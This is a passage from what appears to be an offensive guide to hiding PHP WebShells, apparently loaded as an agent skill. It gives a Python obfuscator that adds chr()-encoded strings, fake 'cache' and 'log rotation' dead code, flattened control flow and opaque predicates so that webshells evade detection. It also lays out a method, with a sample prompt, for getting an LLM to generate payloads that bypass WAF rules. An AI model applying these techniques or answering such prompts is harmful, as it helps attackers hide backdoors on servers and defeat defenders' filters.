### 4.3 AST-Based Code Deformation

Parse the WebShell code into an AST, then apply transformations at the tree level.

**Python-based AST transformation tool concept:**

```python
#!/usr/bin/env python3
"""
AST-Based PHP WebShell Deformation Tool
Transforms PHP WebShell code at the AST level for evasion.
"""
import random
import string
import hashlib

class PHPObfuscator:
    def __init__(self, seed=None):
        self.seed = seed or random.randint(0, 2**32)
        random.seed(self.seed)

    def generate_variable_name(self, length=8):
        chars = string.ascii_letters + string.digits
        return ''.join(random.choices(chars, k=length))

    def obfuscate_string(self, s):
        """Convert string to chr() concatenation"""
        return '.'.join(f'chr({ord(c)})' for c in s)

    def inject_dead_code(self, code):
        """Inject dead code blocks that look legitimate"""
        dead_blocks = [
            """
            // Cache configuration
            $cache_config = ['driver' => 'redis', 'ttl' => 3600];
            if (isset($cache_config['driver'])) {
                $cache_key = md5(uniqid());
            }
            """,
            """
            // Log rotation check
            $log_size = @filesize('/tmp/app.log');
            if ($log_size && $log_size > 10485760) {
                @rename('/tmp/app.log', '/tmp/app.log.bak');
            }
            """,
            """
            // Session cleanup
            $session_path = session_save_path();
            if ($session_path && is_dir($session_path)) {
                $session_files = glob($session_path . '/sess_*');
                $expired = array_filter($session_files, function($f) {
                    return time() - filemtime($f) > 3600;
                });
            }
            """,
        ]
        # Inject dead code at random positions
        lines = code.split('\n')
        for block in dead_blocks:
            if random.random() > 0.5:
                pos = random.randint(0, len(lines))
                lines.insert(pos, block)
        return '\n'.join(lines)

    def flatten_control_flow(self, code):
        """Convert if-else chains to switch-case with opaque predicates"""
        # This is a simplified example; real implementation requires full AST
        dispatcher_var = self.generate_variable_name()
        flattened = f"""
        ${dispatcher_var} = {random.randint(1000, 9999)};
        switch (${dispatcher_var}) {{
            case {random.randint(1000, 9999)}:
                // Original logic here
                {code}
                break;
            default:
                // Dead default
                break;
        }}
        """
        return flattened

    def add_opaque_predicates(self, code):
        """Add conditions that always evaluate to true/false"""
        always_true = [
            'md5("a") == md5("a")',
            'strlen("hello") == 5',
            '1 + 1 == 2',
            'time() > 0',
            'phpversion() == phpversion()',
        ]
        always_false = [
            'md5("a") == md5("b")',
            'strlen("hello") == 6',
            '1 + 1 == 3',
            'time() < 0',
        ]
        pred = random.choice(always_true)
        return f"if ({pred}) {{\n{code}\n}}"
```

### 4.4 LLM-Based WAF Bypass

Use LLMs to analyze WAF rules and generate bypass payloads.

**Bypass strategy:**

```
1. Feed WAF rule set (if known) to LLM
2. LLM identifies rule patterns and edge cases
3. LLM generates payloads that evade those specific rules
4. Test generated payloads
5. LLM iteratively refines based on success/failure
```

**Example LLM prompt for WAF bypass:**

```
I have a WAF that blocks the pattern "eval\s*\(.*\)" in PHP files.
I need to execute code that uses eval. Generate 10 different PHP code
snippets that achieve the same effect as eval($code) but bypass this
WAF rule. Do not use the literal string "eval".
```



---
📖 本切片 2/3 结束。 续篇: `skill_view(name="webshell-evasion", file_path="references/chapter-04-2026-latest-evasion-techniques-03.md")`